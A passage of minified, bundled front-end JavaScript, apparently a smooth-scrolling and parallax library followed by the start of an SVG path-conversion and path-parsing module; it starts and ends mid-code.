                        this.instance.limit[this.directionAxis] &&
                        (this.instance.delta[this.directionAxis] =
                          this.instance.limit[this.directionAxis]),
                      this.stopScrolling(),
                      (this.isScrolling = !0),
                      this.checkScroll(),
                      this.html.classList.add(this.scrollingClass);
                  }
                },
              },
              {
                key: "checkScroll",
                value: function () {
                  var t = this,
                    e =
                      arguments.length > 0 &&
                      void 0 !== arguments[0] &&
                      arguments[0];
                  if (e || this.isScrolling || this.isDraggingScrollbar) {
                    this.hasScrollTicking ||
                      ((this.checkScrollRaf = requestAnimationFrame(
                        function () {
                          return t.checkScroll();
                        }
                      )),
                      (this.hasScrollTicking = !0)),
                      this.updateScroll();
                    var r = Math.abs(
                        this.instance.delta[this.directionAxis] -
                          this.instance.scroll[this.directionAxis]
                      ),
                      n = Date.now() - this.startScrollTs;
                    if (
                      (!this.animatingScroll &&
                        n > 100 &&
                        ((r < 0.5 &&
                          0 != this.instance.delta[this.directionAxis]) ||
                          (r < 0.5 &&
                            0 == this.instance.delta[this.directionAxis])) &&
                        this.stopScrolling(),
                      Object.entries(this.sections).forEach(function (r) {
                        var i = g(r, 2),
                          n = (i[0], i[1]);
                        n.persistent ||
                        (t.instance.scroll[t.directionAxis] >
                          n.offset[t.directionAxis] &&
                          t.instance.scroll[t.directionAxis] <
                            n.limit[t.directionAxis])
                          ? ("horizontal" === t.direction
                              ? t.transform(
                                  n.el,
                                  -t.instance.scroll[t.directionAxis],
                                  0
                                )
                              : t.transform(
                                  n.el,
                                  0,
                                  -t.instance.scroll[t.directionAxis]
                                ),
                            n.inView ||
                              ((n.inView = !0),
                              (n.el.style.opacity = 1),
                              (n.el.style.pointerEvents = "all"),
                              n.el.setAttribute(
                                "data-".concat(t.name, "-section-inview"),
                                ""
                              )))
                          : ((n.inView || e) &&
                              ((n.inView = !1),
                              (n.el.style.opacity = 0),
                              (n.el.style.pointerEvents = "none"),
                              n.el.removeAttribute(
                                "data-".concat(t.name, "-section-inview")
                              )),
                            t.transform(n.el, 0, 0));
                      }),
                      this.getDirection && this.addDirection(),
                      this.getSpeed &&
                        (this.addSpeed(), (this.speedTs = Date.now())),
                      this.detectElements(),
                      this.transformElements(),
                      this.hasScrollbar)
                    ) {
                      var s =
                        (this.instance.scroll[this.directionAxis] /
                          this.instance.limit[this.directionAxis]) *
                        this.scrollBarLimit[this.directionAxis];
                      "horizontal" === this.direction
                        ? this.transform(this.scrollbarThumb, s, 0)
                        : this.transform(this.scrollbarThumb, 0, s);
                    }
                    f(h(i.prototype), "checkScroll", this).call(this),
                      (this.hasScrollTicking = !1);
                  }
                },
              },
              {
                key: "resize",
                value: function () {
                  (this.windowHeight = window.innerHeight),
                    (this.windowWidth = window.innerWidth),
                    this.checkContext(),
                    (this.windowMiddle = {
                      x: this.windowWidth / 2,
                      y: this.windowHeight / 2,
                    }),
                    this.update();
                },
              },
              {
                key: "updateDelta",
                value: function (t) {
                  var e,
                    r =
                      this[this.context] && this[this.context].gestureDirection
                        ? this[this.context].gestureDirection
                        : this.gestureDirection;
                  (e =
                    "both" === r
                      ? t.deltaX + t.deltaY
                      : "vertical" === r
                      ? t.deltaY
                      : "horizontal" === r
                      ? t.deltaX
                      : t.deltaY),
                    (this.instance.delta[this.directionAxis] -=
                      e * this.multiplier),
                    this.instance.delta[this.directionAxis] < 0 &&
                      (this.instance.delta[this.directionAxis] = 0),
                    this.instance.delta[this.directionAxis] >
                      this.instance.limit[this.directionAxis] &&
                      (this.instance.delta[this.directionAxis] =
                        this.instance.limit[this.directionAxis]);
                },
              },
              {
                key: "updateScroll",
                value: function (t) {
                  this.isScrolling || this.isDraggingScrollbar
                    ? (this.instance.scroll[this.directionAxis] = X(
                        this.instance.scroll[this.directionAxis],
                        this.instance.delta[this.directionAxis],
                        this.lerp
                      ))
                    : this.instance.scroll[this.directionAxis] >
                      this.instance.limit[this.directionAxis]
                    ? this.setScroll(
                        this.instance.scroll[this.directionAxis],
                        this.instance.limit[this.directionAxis]
                      )
                    : this.instance.scroll.y < 0
                    ? this.setScroll(
                        this.instance.scroll[this.directionAxis],
                        0
                      )
                    : this.setScroll(
                        this.instance.scroll[this.directionAxis],
                        this.instance.delta[this.directionAxis]
                      );
                },
              },
              {
                key: "addDirection",
                value: function () {
                  this.instance.delta.y > this.instance.scroll.y
                    ? "down" !== this.instance.direction &&
                      (this.instance.direction = "down")
                    : this.instance.delta.y < this.instance.scroll.y &&
                      "up" !== this.instance.direction &&
                      (this.instance.direction = "up"),
                    this.instance.delta.x > this.instance.scroll.x
                      ? "right" !== this.instance.direction &&
                        (this.instance.direction = "right")
                      : this.instance.delta.x < this.instance.scroll.x &&
                        "left" !== this.instance.direction &&
                        (this.instance.direction = "left");
                },
              },
              {
                key: "addSpeed",
                value: function () {
                  this.instance.delta[this.directionAxis] !=
                  this.instance.scroll[this.directionAxis]
                    ? (this.instance.speed =
                        (this.instance.delta[this.directionAxis] -
                          this.instance.scroll[this.directionAxis]) /
                        Math.max(1, Date.now() - this.speedTs))
                    : (this.instance.speed = 0);
                },
              },
              {
                key: "initScrollBar",
                value: function () {
                  if (
                    ((this.scrollbar = document.createElement("span")),
                    (this.scrollbarThumb = document.createElement("span")),
                    this.scrollbar.classList.add(
                      "".concat(this.scrollbarClass)
                    ),
                    this.scrollbarThumb.classList.add(
                      "".concat(this.scrollbarClass, "_thumb")
                    ),
                    this.scrollbar.append(this.scrollbarThumb),
                    this.scrollbarContainer
                      ? this.scrollbarContainer.append(this.scrollbar)
                      : document.body.append(this.scrollbar),
                    (this.getScrollBar = this.getScrollBar.bind(this)),
                    (this.releaseScrollBar = this.releaseScrollBar.bind(this)),
                    (this.moveScrollBar = this.moveScrollBar.bind(this)),
                    this.scrollbarThumb.addEventListener(
                      "mousedown",
                      this.getScrollBar
                    ),
                    window.addEventListener("mouseup", this.releaseScrollBar),
                    window.addEventListener("mousemove", this.moveScrollBar),
                    (this.hasScrollbar = !1),
                    "horizontal" == this.direction)
                  ) {
                    if (
                      this.instance.limit.x + this.windowWidth <=
                      this.windowWidth
                    )
                      return;
                  } else if (
                    this.instance.limit.y + this.windowHeight <=
                    this.windowHeight
                  )
                    return;
                  (this.hasScrollbar = !0),
                    (this.scrollbarBCR =
                      this.scrollbar.getBoundingClientRect()),
                    (this.scrollbarHeight = this.scrollbarBCR.height),
                    (this.scrollbarWidth = this.scrollbarBCR.width),
                    "horizontal" === this.direction
                      ? (this.scrollbarThumb.style.width = "".concat(
                          (this.scrollbarWidth * this.scrollbarWidth) /
                            (this.instance.limit.x + this.scrollbarWidth),
                          "px"
                        ))
                      : (this.scrollbarThumb.style.height = "".concat(
                          (this.scrollbarHeight * this.scrollbarHeight) /
                            (this.instance.limit.y + this.scrollbarHeight),
                          "px"
                        )),
                    (this.scrollbarThumbBCR =
                      this.scrollbarThumb.getBoundingClientRect()),
                    (this.scrollBarLimit = {
                      x: this.scrollbarWidth - this.scrollbarThumbBCR.width,
                      y: this.scrollbarHeight - this.scrollbarThumbBCR.height,
                    });
                },
              },
              {
                key: "reinitScrollBar",
                value: function () {
                  if (
                    ((this.hasScrollbar = !1), "horizontal" == this.direction)
                  ) {
                    if (
                      this.instance.limit.x + this.windowWidth <=
                      this.windowWidth
                    )
                      return;
                  } else if (
                    this.instance.limit.y + this.windowHeight <=
                    this.windowHeight
                  )
                    return;
                  (this.hasScrollbar = !0),
                    (this.scrollbarBCR =
                      this.scrollbar.getBoundingClientRect()),
                    (this.scrollbarHeight = this.scrollbarBCR.height),
                    (this.scrollbarWidth = this.scrollbarBCR.width),
                    "horizontal" === this.direction
                      ? (this.scrollbarThumb.style.width = "".concat(
                          (this.scrollbarWidth * this.scrollbarWidth) /
                            (this.instance.limit.x + this.scrollbarWidth),
                          "px"
                        ))
                      : (this.scrollbarThumb.style.height = "".concat(
                          (this.scrollbarHeight * this.scrollbarHeight) /
                            (this.instance.limit.y + this.scrollbarHeight),
                          "px"
                        )),
                    (this.scrollbarThumbBCR =
                      this.scrollbarThumb.getBoundingClientRect()),
                    (this.scrollBarLimit = {
                      x: this.scrollbarWidth - this.scrollbarThumbBCR.width,
                      y: this.scrollbarHeight - this.scrollbarThumbBCR.height,
                    });
                },
              },
              {
                key: "destroyScrollBar",
                value: function () {
                  this.scrollbarThumb.removeEventListener(
                    "mousedown",
                    this.getScrollBar
                  ),
                    window.removeEventListener(
                      "mouseup",
                      this.releaseScrollBar
                    ),
                    window.removeEventListener("mousemove", this.moveScrollBar),
                    this.scrollbar.remove();
                },
              },
              {
                key: "getScrollBar",
                value: function (t) {
                  (this.isDraggingScrollbar = !0),
                    this.checkScroll(),
                    this.html.classList.remove(this.scrollingClass),
                    this.html.classList.add(this.draggingClass);
                },
              },
              {
                key: "releaseScrollBar",
                value: function (t) {
                  (this.isDraggingScrollbar = !1),
                    this.html.classList.add(this.scrollingClass),
                    this.html.classList.remove(this.draggingClass);
                },
              },
              {
                key: "moveScrollBar",
                value: function (t) {
                  var e = this;
                  this.isDraggingScrollbar &&
                    requestAnimationFrame(function () {
                      var r =
                          (((100 * (t.clientX - e.scrollbarBCR.left)) /
                            e.scrollbarWidth) *
                            e.instance.limit.x) /
                          100,
                        i =
                          (((100 * (t.clientY - e.scrollbarBCR.top)) /
                            e.scrollbarHeight) *
                            e.instance.limit.y) /
                          100;
                      i > 0 &&
                        i < e.instance.limit.y &&
                        (e.instance.delta.y = i),
                        r > 0 &&
                          r < e.instance.limit.x &&
                          (e.instance.delta.x = r);
                    });
                },
              },
              {
                key: "addElements",
                value: function () {
                  var t = this;
                  (this.els = {}),
                    (this.parallaxElements = {}),
                    this.el
                      .querySelectorAll("[data-".concat(this.name, "]"))
                      .forEach(function (e, r) {
                        var i,
                          n,
                          s,
                          o = G(e),
                          a = Object.entries(t.sections)
                            .map(function (t) {
                              var e = g(t, 2);
                              return e[0], e[1];
                            })
                            .find(function (t) {
                              return o.includes(t.el);
                            }),
                          l = e.dataset[t.name + "Class"] || t.class,
                          h =
                            "string" == typeof e.dataset[t.name + "Id"]
                              ? e.dataset[t.name + "Id"]
                              : "el" + r,
                          u = e.dataset[t.name + "Repeat"],
                          c = e.dataset[t.name + "Call"],
                          d = e.dataset[t.name + "Position"],
                          p = e.dataset[t.name + "Delay"],
                          f = e.dataset[t.name + "Direction"],
                          m = "string" == typeof e.dataset[t.name + "Sticky"],
                          _ =
                            !!e.dataset[t.name + "Speed"] &&
                            parseFloat(e.dataset[t.name + "Speed"]) / 10,
                          v =
                            "string" == typeof e.dataset[t.name + "Offset"]
                              ? e.dataset[t.name + "Offset"].split(",")
                              : t.offset,
                          y = e.dataset[t.name + "Target"],
                          D = (s =
                            void 0 !== y
                              ? document.querySelector("".concat(y))
                              : e).getBoundingClientRect();
                        null === a || a.inView
                          ? ((i = D.top + t.instance.scroll.y - Y(s).y),
                            (n = D.left + t.instance.scroll.x - Y(s).x))
                          : ((i = D.top - Y(a.el).y - Y(s).y),
                            (n = D.left - Y(a.el).x - Y(s).x));
                        var x = i + s.offsetHeight,
                          b = n + s.offsetWidth,
                          w = { x: (b - n) / 2 + n, y: (x - i) / 2 + i };
                        if (m) {
                          var T = e.getBoundingClientRect(),
                            S = T.top,
                            E = T.left,
                            C = { x: E - n, y: S - i };
                          (i += window.innerHeight),
                            (n += window.innerWidth),
                            (x =
                              S +
                              s.offsetHeight -
                              e.offsetHeight -
                              C[t.directionAxis]),
                            (w = {
                              x:
                                ((b =
                                  E +
                                  s.offsetWidth -
                                  e.offsetWidth -
                                  C[t.directionAxis]) -
                                  n) /
                                  2 +
                                n,
                              y: (x - i) / 2 + i,
                            });
                        }
                        u = "false" != u && (null != u || t.repeat);
                        var P = [0, 0];
                        if (v)
                          if ("horizontal" === t.direction) {
                            for (var F = 0; F < v.length; F++)
                              "string" == typeof v[F]
                                ? v[F].includes("%")
                                  ? (P[F] = parseInt(
                                      (v[F].replace("%", "") * t.windowWidth) /
                                        100
                                    ))
                                  : (P[F] = parseInt(v[F]))
                                : (P[F] = v[F]);
                            (n += P[0]), (b -= P[1]);
                          } else {
                            for (F = 0; F < v.length; F++)
                              "string" == typeof v[F]
                                ? v[F].includes("%")
                                  ? (P[F] = parseInt(
                                      (v[F].replace("%", "") * t.windowHeight) /
                                        100
                                    ))
                                  : (P[F] = parseInt(v[F]))
                                : (P[F] = v[F]);
                            (i += P[0]), (x -= P[1]);
                          }
                        var M = {
                          el: e,
                          id: h,
                          class: l,
                          section: a,
                          top: i,
                          middle: w,
                          bottom: x,
                          left: n,
                          right: b,
                          offset: v,
                          progress: 0,
                          repeat: u,
                          inView: !1,
                          call: c,
                          speed: _,
                          delay: p,
                          position: d,
                          target: s,
                          direction: f,
                          sticky: m,
                        };
                        (t.els[h] = M),
                          e.classList.contains(l) && t.setInView(t.els[h], h),
                          (!1 !== _ || m) && (t.parallaxElements[h] = M);
                      });
                },
              },
              {
                key: "addSections",
                value: function () {
                  var t = this;
                  this.sections = {};
                  var e = this.el.querySelectorAll(
                    "[data-".concat(this.name, "-section]")
                  );
                  0 === e.length && (e = [this.el]),
                    e.forEach(function (e, r) {
                      var i =
                          "string" == typeof e.dataset[t.name + "Id"]
                            ? e.dataset[t.name + "Id"]
                            : "section" + r,
                        n = e.getBoundingClientRect(),
                        s = {
                          x: n.left - 1.5 * window.innerWidth - Y(e).x,
                          y: n.top - 1.5 * window.innerHeight - Y(e).y,
                        },
                        o = {
                          x: s.x + n.width + 2 * window.innerWidth,
                          y: s.y + n.height + 2 * window.innerHeight,
                        },
                        a = "string" == typeof e.dataset[t.name + "Persistent"];
                      e.setAttribute("data-scroll-section-id", i);
                      var l = {
                        el: e,
                        offset: s,
                        limit: o,
                        inView: !1,
                        persistent: a,
                        id: i,
                      };
                      t.sections[i] = l;
                    });
                },
              },
              {
                key: "transform",
                value: function (t, e, r, i) {
                  var n;
                  if (i) {
                    var s = Y(t),
                      o = X(s.x, e, i),
                      a = X(s.y, r, i);
                    n = "matrix3d(1,0,0.00,0,0.00,1,0.00,0,0,0,1,0,"
                      .concat(o, ",")
                      .concat(a, ",0,1)");
                  } else
                    n = "matrix3d(1,0,0.00,0,0.00,1,0.00,0,0,0,1,0,"
                      .concat(e, ",")
                      .concat(r, ",0,1)");
                  (t.style.webkitTransform = n),
                    (t.style.msTransform = n),
                    (t.style.transform = n);
                },
              },
              {
                key: "transformElements",
                value: function (t) {
                  var e = this,
                    r =
                      arguments.length > 1 &&
                      void 0 !== arguments[1] &&
                      arguments[1],
                    i = this.instance.scroll.x + this.windowWidth,
                    n = this.instance.scroll.y + this.windowHeight,
                    s = {
                      x: this.instance.scroll.x + this.windowMiddle.x,
                      y: this.instance.scroll.y + this.windowMiddle.y,
                    };
                  Object.entries(this.parallaxElements).forEach(function (o) {
                    var a = g(o, 2),
                      l = (a[0], a[1]),
                      h = !1;
                    if ((t && (h = 0), l.inView || r))
                      switch (l.position) {
                        case "top":
                        case "left":
                          h = e.instance.scroll[e.directionAxis] * -l.speed;
                          break;
                        case "elementTop":
                          h = (n - l.top) * -l.speed;
                          break;
                        case "bottom":
                          h =
                            (e.instance.limit[e.directionAxis] -
                              n +
                              e.windowHeight) *
                            l.speed;
                          break;
                        case "elementLeft":
                          h = (i - l.left) * -l.speed;
                          break;
                        case "right":
                          h =
                            (e.instance.limit[e.directionAxis] -
                              i +
                              e.windowHeight) *
                            l.speed;
                          break;
                        default:
                          h =
                            (s[e.directionAxis] - l.middle[e.directionAxis]) *
                            -l.speed;
                      }
                    l.sticky &&
                      (h = l.inView
                        ? "horizontal" === e.direction
                          ? e.instance.scroll.x - l.left + window.innerWidth
                          : e.instance.scroll.y - l.top + window.innerHeight
                        : "horizontal" === e.direction
                        ? e.instance.scroll.x < l.left - window.innerWidth &&
                          e.instance.scroll.x < l.left - window.innerWidth / 2
                          ? 0
                          : e.instance.scroll.x > l.right &&
                            e.instance.scroll.x > l.right + 100 &&
                            l.right - l.left + window.innerWidth
                        : e.instance.scroll.y < l.top - window.innerHeight &&
                          e.instance.scroll.y < l.top - window.innerHeight / 2
                        ? 0
                        : e.instance.scroll.y > l.bottom &&
                          e.instance.scroll.y > l.bottom + 100 &&
                          l.bottom - l.top + window.innerHeight),
                      !1 !== h &&
                        ("horizontal" === l.direction ||
                        ("horizontal" === e.direction &&
                          "vertical" !== l.direction)
                          ? e.transform(l.el, h, 0, !t && l.delay)
                          : e.transform(l.el, 0, h, !t && l.delay));
                  });
                },
              },
              {
                key: "scrollTo",
                value: function (t) {
                  var e = this,
                    r =
                      arguments.length > 1 && void 0 !== arguments[1]
                        ? arguments[1]
                        : {},
                    i = parseInt(r.offset) || 0,
                    n = isNaN(parseInt(r.duration))
                      ? 1e3
                      : parseInt(r.duration),
                    s = r.easing || [0.25, 0, 0.35, 1],
                    o = !!r.disableLerp,
                    a = !!r.callback && r.callback;
                  if (((s = rt.apply(void 0, m(s))), "string" == typeof t)) {
                    if ("top" === t) t = 0;
                    else if ("bottom" === t) t = this.instance.limit.y;
                    else if ("left" === t) t = 0;
                    else if ("right" === t) t = this.instance.limit.x;
                    else if (!(t = document.querySelector(t))) return;
                  } else if ("number" == typeof t) t = parseInt(t);
                  else if (!t || !t.tagName)
                    return void console.warn("`target` parameter is not valid");
                  if ("number" != typeof t) {
                    if (!G(t).includes(this.el)) return;
                    var f,
                      h = t.getBoundingClientRect(),
                      u = h.top,
                      c = h.left,
                      p = G(t).find(function (t) {
                        return Object.entries(e.sections)
                          .map(function (t) {
                            var e = g(t, 2);
                            return e[0], e[1];
                          })
                          .find(function (e) {
                            return e.el == t;
                          });
                      });
                    (f = p
                      ? Y(p)[this.directionAxis]
                      : -this.instance.scroll[this.directionAxis]),
                      (i =
                        "horizontal" === this.direction
                          ? c + i - f
                          : u + i - f);
                  } else i = t + i;
                  var _ = parseFloat(this.instance.delta[this.directionAxis]),
                    y =
                      Math.max(
                        0,
                        Math.min(i, this.instance.limit[this.directionAxis])
                      ) - _,
                    D = function (t) {
                      o
                        ? "horizontal" === e.direction
                          ? e.setScroll(_ + y * t, e.instance.delta.y)
                          : e.setScroll(e.instance.delta.x, _ + y * t)
                        : (e.instance.delta[e.directionAxis] = _ + y * t);
                    };
                  (this.animatingScroll = !0),
                    this.stopScrolling(),
                    this.startScrolling();
                  var x = Date.now();
                  !(function t() {
                    var r = (Date.now() - x) / n;
                    r > 1
                      ? (D(1),
                        (e.animatingScroll = !1),
                        0 == n && e.update(),
                        a && a())
                      : ((e.scrollToRaf = requestAnimationFrame(t)), D(s(r)));
                  })();
                },
              },
              {
                key: "update",
                value: function () {
                  this.setScrollLimit(),
                    this.addSections(),
                    this.addElements(),
                    this.detectElements(),
                    this.updateScroll(),
                    this.transformElements(!0),
                    this.reinitScrollBar(),
                    this.checkScroll(!0);
                },
              },
              {
                key: "startScroll",
                value: function () {
                  this.stop = !1;
                },
              },
              {
                key: "stopScroll",
                value: function () {
                  this.stop = !0;
                },
              },
              {
                key: "setScroll",
                value: function (t, e) {
                  this.instance = a(
                    a({}, this.instance),
                    {},
                    { scroll: { x: t, y: e }, delta: { x: t, y: e }, speed: 0 }
                  );
                },
              },
              {
                key: "destroy",
                value: function () {
                  f(h(i.prototype), "destroy", this).call(this),
                    this.stopScrolling(),
                    this.html.classList.remove(this.smoothClass),
                    this.vs.destroy(),
                    this.destroyScrollBar(),
                    window.removeEventListener("keydown", this.checkKey, !1);
                },
              },
            ]),
            i
          );
        })(D),
        dt = (function () {
          function t() {
            var e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : {};
            r(this, t),
              (this.options = e),
              Object.assign(this, y, e),
              (this.smartphone = y.smartphone),
              e.smartphone && Object.assign(this.smartphone, e.smartphone),
              (this.tablet = y.tablet),
              e.tablet && Object.assign(this.tablet, e.tablet),
              this.smooth ||
                "horizontal" != this.direction ||
                console.warn(
                  "🚨 `smooth:false` & `horizontal` direction are not yet compatible"
                ),
              this.tablet.smooth ||
                "horizontal" != this.tablet.direction ||
                console.warn(
                  "🚨 `smooth:false` & `horizontal` direction are not yet compatible (tablet)"
                ),
              this.smartphone.smooth ||
                "horizontal" != this.smartphone.direction ||
                console.warn(
                  "🚨 `smooth:false` & `horizontal` direction are not yet compatible (smartphone)"
                ),
              this.init();
          }
          return (
            n(t, [
              {
                key: "init",
                value: function () {
                  if (
                    ((this.options.isMobile =
                      /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                        navigator.userAgent
                      ) ||
                      ("MacIntel" === navigator.platform &&
                        navigator.maxTouchPoints > 1) ||
                      window.innerWidth < this.tablet.breakpoint),
                    (this.options.isTablet =
                      this.options.isMobile &&
                      window.innerWidth >= this.tablet.breakpoint),
                    (this.smooth && !this.options.isMobile) ||
                    (this.tablet.smooth && this.options.isTablet) ||
                    (this.smartphone.smooth &&
                      this.options.isMobile &&
                      !this.options.isTablet)
                      ? (this.scroll = new ct(this.options))
                      : (this.scroll = new T(this.options)),
                    this.scroll.init(),
                    window.location.hash)
                  ) {
                    var t = window.location.hash.slice(
                        1,
                        window.location.hash.length
                      ),
                      e = document.getElementById(t);
                    e && this.scroll.scrollTo(e);
                  }
                },
              },
              {
                key: "update",
                value: function () {
                  this.scroll.update();
                },
              },
              {
                key: "start",
                value: function () {
                  this.scroll.startScroll();
                },
              },
              {
                key: "stop",
                value: function () {
                  this.scroll.stopScroll();
                },
              },
              {
                key: "scrollTo",
                value: function (t, e) {
                  this.scroll.scrollTo(t, e);
                },
              },
              {
                key: "setScroll",
                value: function (t, e) {
                  this.scroll.setScroll(t, e);
                },
              },
              {
                key: "on",
                value: function (t, e) {
                  this.scroll.setEvents(t, e);
                },
              },
              {
                key: "off",
                value: function (t, e) {
                  this.scroll.unsetEvents(t, e);
                },
              },
              {
                key: "destroy",
                value: function () {
                  this.scroll.destroy();
                },
              },
            ]),
            t
          );
        })();
      e.a = dt;
    }).call(this, r(47));
  },
  function (t, e, r) {
    !(function (t) {
      "use strict";
      var e = /[achlmqstvz]|(-?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,
        r = /(?:(-)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,
        i = /[\+\-]?\d*\.?\d+e[\+\-]?\d+/gi,
        n = /(^[#\.][a-z]|[a-y][a-z])/i,
        s = Math.PI / 180,
        o = Math.sin,
        a = Math.cos,
        l = Math.abs,
        h = Math.sqrt,
        u = function (t) {
          return "string" == typeof t;
        },
        c = function (t) {
          return "number" == typeof t;
        },
        d = function (t) {
          return Math.round(1e5 * t) / 1e5 || 0;
        };
      function p(t) {
        var e,
          r = 0;
        for (t.reverse(); r < t.length; r += 2)
          (e = t[r]), (t[r] = t[r + 1]), (t[r + 1] = e);
        t.reversed = !t.reversed;
      }
      var f = {
        rect: "rx,ry,x,y,width,height",
        circle: "r,cx,cy",
        ellipse: "rx,ry,cx,cy",
        line: "x1,x2,y1,y2",
      };
      function g(t, e) {
        var i,
          n,
          s,
          o,
          a,
          l,
          h,
          u,
          c,
          d,
          p,
          g,
          m,
          y,
          D,
          x,
          b,
          w,
          T,
          S,
          E,
          C,
          P = t.tagName.toLowerCase(),
          F = 0.552284749831;
        return "path" !== P && t.getBBox
          ? ((l = (function (t, e) {
              var r,
                i = document.createElementNS(
                  "http://www.w3.org/2000/svg",
                  "path"
                ),
                n = [].slice.call(t.attributes),
                s = n.length;
              for (e = "," + e + ","; --s > -1; )
                (r = n[s].nodeName.toLowerCase()),
                  e.indexOf("," + r + ",") < 0 &&
                    i.setAttributeNS(null, r, n[s].nodeValue);
              return i;
            })(t, "x,y,width,height,cx,cy,rx,ry,r,x1,x2,y1,y2,points")),
            (C = (function (t, e) {
              for (
                var r = e ? e.split(",") : [], i = {}, n = r.length;
                --n > -1;

              )
                i[r[n]] = +t.getAttribute(r[n]) || 0;
              return i;
            })(t, f[P])),
            "rect" === P
              ? ((o = C.rx),
                (a = C.ry || o),
                (n = C.x),
                (s = C.y),
                (d = C.width - 2 * o),
                (p = C.height - 2 * a),
                (i =
                  o || a
                    ? "M" +
                      (x = (y = (m = n + o) + d) + o) +
                      "," +
                      (w = s + a) +
                      " V" +
                      (T = w + p) +
                      " C" +
                      [
                        x,
                        (S = T + a * F),
                        (D = y + o * F),
                        (E = T + a),
                        y,
                        E,
                        y - (y - m) / 3,
                        E,
                        m + (y - m) / 3,
                        E,
                        m,
                        E,
                        (g = n + o * (1 - F)),
                        E,
                        n,
                        S,
                        n,
                        T,
                        n,
                        T - (T - w) / 3,
                        n,
                        w + (T - w) / 3,
                        n,
                        w,
                        n,
                        (b = s + a * (1 - F)),
                        g,
                        s,
                        m,
                        s,
                        m + (y - m) / 3,
                        s,
                        y - (y - m) / 3,
                        s,
                        y,
                        s,
                        D,
                        s,
                        x,
                        b,
                        x,
                        w,
                      ].join(",") +
                      "z"
                    : "M" +
                      (n + d) +
                      "," +
                      s +
                      " v" +
                      p +
                      " h" +
                      -d +
                      " v" +
                      -p +
                      " h" +
                      d +
                      "z"))
              : "circle" === P || "ellipse" === P
              ? ("circle" === P
                  ? (u = (o = a = C.r) * F)
                  : ((o = C.rx), (u = (a = C.ry) * F)),
                (i =
                  "M" +
                  ((n = C.cx) + o) +
                  "," +
                  (s = C.cy) +
                  " C" +
                  [
                    n + o,
                    s + u,
                    n + (h = o * F),
                    s + a,
                    n,
                    s + a,
                    n - h,
                    s + a,
                    n - o,
                    s + u,
                    n - o,
                    s,
                    n - o,
                    s - u,
                    n - h,
                    s - a,
                    n,
                    s - a,
                    n + h,
                    s - a,
                    n + o,
                    s - u,
                    n + o,
                    s,
                  ].join(",") +
                  "z"))
              : "line" === P
              ? (i = "M" + C.x1 + "," + C.y1 + " L" + C.x2 + "," + C.y2)
              : ("polyline" !== P && "polygon" !== P) ||
                ((i =
                  "M" +
                  (n = (c =
                    (t.getAttribute("points") + "").match(r) || []).shift()) +
                  "," +
                  (s = c.shift()) +
                  " L" +
                  c.join(",")),
                "polygon" === P && (i += "," + n + "," + s + "z")),
            l.setAttribute("d", v((l._gsRawPath = _(i)))),
            e &&
              t.parentNode &&
              (t.parentNode.insertBefore(l, t), t.parentNode.removeChild(t)),
            l)
          : t;
      }
      function m(t, e, r, i, n, u, c, d, p) {
        if (t !== d || e !== p) {
          (r = l(r)), (i = l(i));
          var f = (n % 360) * s,
            g = a(f),
            m = o(f),
            _ = Math.PI,
            v = 2 * _,
            y = (t - d) / 2,
            D = (e - p) / 2,
            x = g * y + m * D,
            b = -m * y + g * D,
            w = x * x,
            T = b * b,
            S = w / (r * r) + T / (i * i);
          S > 1 && ((r = h(S) * r), (i = h(S) * i));
          var E = r * r,
            C = i * i,
            P = (E * C - E * T - C * w) / (E * T + C * w);
          P < 0 && (P = 0);
          var F = (u === c ? -1 : 1) * h(P),
            M = F * ((r * b) / i),
            R = F * ((-i * x) / r),
            A = (t + d) / 2 + (g * M - m * R),
            O = (e + p) / 2 + (m * M + g * R),
            k = (x - M) / r,
            L = (b - R) / i,
            B = (-x - M) / r,
            z = (-b - R) / i,
            I = k * k + L * L,
            j = (L < 0 ? -1 : 1) * Math.acos(k / h(I)),
            V =
              (k * z - L * B < 0 ? -1 : 1) *
              Math.acos((k * B + L * z) / h(I * (B * B + z * z)));
          isNaN(V) && (V = _),
            !c && V > 0 ? (V -= v) : c && V < 0 && (V += v),
            (j %= v),
            (V %= v);
          var N,
            U = Math.ceil(l(V) / (v / 4)),
            W = [],
            H = V / U,
            q = ((4 / 3) * o(H / 2)) / (1 + a(H / 2)),
            X = g * r,
            Y = m * r,
            G = m * -i,
            K = g * i;
          for (N = 0; N < U; N++)
            (x = a((n = j + N * H))),
              (b = o(n)),
              (k = a((n += H))),
              (L = o(n)),
              W.push(x - q * b, b + q * x, k + q * L, L - q * k, k, L);
          for (N = 0; N < W.length; N += 2)
            (x = W[N]),
              (b = W[N + 1]),
              (W[N] = x * X + b * G + A),
              (W[N + 1] = x * Y + b * K + O);
          return (W[N - 2] = d), (W[N - 1] = p), W;
        }
      }
      function _(t) {
        var r,
          n,
          s,
          o,
          a,
          h,
          u,
          c,
          d,
          p,
          f,
          g,
          _,
          v,
          y,
          D =
            (t + "")
              .replace(i, function (t) {
                var e = +t;
                return e < 1e-4 && e > -1e-4 ? 0 : e;
              })
              .match(e) || [],
          x = [],
          b = 0,
          w = 0,
          T = D.length,
          S = 0,
          E = "ERROR: malformed path: " + t,
          C = function (t, e, r, i) {
            (p = (r - t) / 3),
              (f = (i - e) / 3),
              u.push(t + p, e + f, r - p, i - f, r, i);
          };
        if (!t || !isNaN(D[0]) || isNaN(D[1])) return console.log(E), x;
        for (r = 0; r < T; r++)
          if (
            ((_ = a),
            isNaN(D[r]) ? (h = (a = D[r].toUpperCase()) !== D[r]) : r--,
            (s = +D[r + 1]),
            (o = +D[r + 2]),
            h && ((s += b), (o += w)),
            r || ((c = s), (d = o)),
            "M" === a)
          )
            u && (u.length < 8 ? (x.length -= 1) : (S += u.length)),
              (b = c = s),
              (w = d = o),
              (u = [s, o]),
              x.push(u),
              (r += 2),
              (a = "L");
          else if ("C" === a)
            u || (u = [0, 0]),
              h || (b = w = 0),
              u.push(
                s,
                o,
                b + 1 * D[r + 3],
                w + 1 * D[r + 4],
                (b += 1 * D[r + 5]),
                (w += 1 * D[r + 6])
              ),
              (r += 6);
          else if ("S" === a)
            (p = b),
              (f = w),
              ("C" !== _ && "S" !== _) ||
                ((p += b - u[u.length - 4]), (f += w - u[u.length - 3])),
              h || (b = w = 0),
              u.push(p, f, s, o, (b += 1 * D[r + 3]), (w += 1 * D[r + 4])),
              (r += 4);
          else if ("Q" === a)
            (p = b + (2 / 3) * (s - b)),
              (f = w + (2 / 3) * (o - w)),
              h || (b = w = 0),
